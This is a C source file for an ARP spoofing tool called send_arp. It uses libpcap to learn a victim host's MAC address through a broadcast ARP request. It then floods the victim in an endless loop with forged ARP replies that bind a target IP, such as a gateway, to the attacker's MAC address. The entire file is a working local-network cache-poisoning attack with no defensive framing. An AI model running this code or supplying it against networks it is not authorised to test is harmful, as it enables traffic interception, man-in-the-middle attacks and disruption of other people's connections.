#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <stdint.h>

#define ETHERTYPE_ARP  0x0806

void usage()
{
	printf("Usage: send_arp <interface> <sender ip> <target ip>\n");
	printf("ex:    send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

static int GetSvrMacAddress( char *pIface, unsigned char *cMacAddr)
{
	int nSD;
	struct ifreq sIfReq;
	struct if_nameindex *pIfList;
	struct if_nameindex *pListSave;

	pIfList = (struct if_nameindex *)NULL;
	pListSave = (struct if_nameindex *)NULL;

	#ifndef SIOCGIFADDR
	return( 0 );
	#endif

	nSD = socket( PF_INET, SOCK_STREAM, 0 );
	if ( nSD < 0 )
	{
		printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
		return( 0 );
	}

	pIfList = pListSave = if_nameindex();

	for ( pIfList; *(char *)pIfList != 0; pIfList++ )
	{
		if ( strcmp(pIfList->if_name, pIface) )
			continue;
		strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );

		if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
		{
			printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
			return( 0 );
		}
		memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
		break;
	}
	if_freenameindex( pListSave );
	close( nSD );
	return( 1 );
}

void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac, unsigned short opcode)
{
	unsigned char packet[ETHERMTU];
	struct ether_header *eth_h;
	struct ether_arp *arp_h;

	memset(packet, 0, ETHERMTU);

	eth_h = (struct ether_header*)packet;
	memcpy(eth_h->ether_dhost, dstMac, 6);
	memcpy(eth_h->ether_shost, srcMac, 6);
	eth_h->ether_type = htons(ETHERTYPE_ARP);

	arp_h = (struct ether_arp*)(packet + 14);
	arp_h->ea_hdr.ar_hrd = htons(0x1);
	arp_h->ea_hdr.ar_pro = htons(0x0800);
	arp_h->ea_hdr.ar_hln = 0x06;
	arp_h->ea_hdr.ar_pln = 0x04;
	arp_h->ea_hdr.ar_op = htons(opcode);
	memcpy(arp_h->arp_sha, srcMac, 6);
	memcpy(arp_h->arp_spa, src_ip, 4);
	if(!memcmp(dstMac, "\xff\xff\xff\xff\xff\xff", 6))
		memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00", 6);
	else
		memcpy(arp_h->arp_tha, dstMac, 6);
	memcpy(arp_h->arp_tpa, dst_ip, 4);

	if(pcap_sendpacket(handle, packet, sizeof(struct ether_header)+ sizeof(struct ether_arp)))
		printf("SendPacket Failed\n");
	printf("SendPacket Success!\n");
	//sleep(3);
}

void GetTargetMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char broadcast[7] = "\xff\xff\xff\xff\xff\xff";

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}

  	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;

	    const u_char* packet;
	    unsigned short eth_type;

	    SendPacket(handle, src_ip, dst_ip, srcMac, broadcast, 1);
	    int res = pcap_next_ex(handle, &header, &packet);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	      if(!memcmp(dst_ip, arp_h->arp_spa, 4))
	      {
	      	memcpy(dstMac, arp_h->arp_sha, 6);
	      	pcap_close(handle);
	      	return;
	      }
    	}
  	}
  pcap_close(handle);
}

void ARPInfection(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}
	while(true)
		SendPacket(handle, src_ip, dst_ip, srcMac, dstMac, 2);
	pcap_close(handle);
}

int main(int argc, char *argv[])
{
	char *dev;
	struct in_addr sender_ip;
	struct in_addr target_ip;
	unsigned char LocalMac[6];
	unsigned char SenderMac[6];

	if(argc != 4)
	{
		usage();
		return 0;
	}

	dev = argv[1];
	inet_aton(argv[2], &sender_ip);
	inet_aton(argv[3], &target_ip);
	if (!GetSvrMacAddress(dev, LocalMac))
	{
		printf("Can't get Local MAC address\n");
		return 0;
	}
	GetTargetMac(dev, &target_ip, &sender_ip, LocalMac, SenderMac);
	ARPInfection(dev, &target_ip, &sender_ip, LocalMac, SenderMac);
}
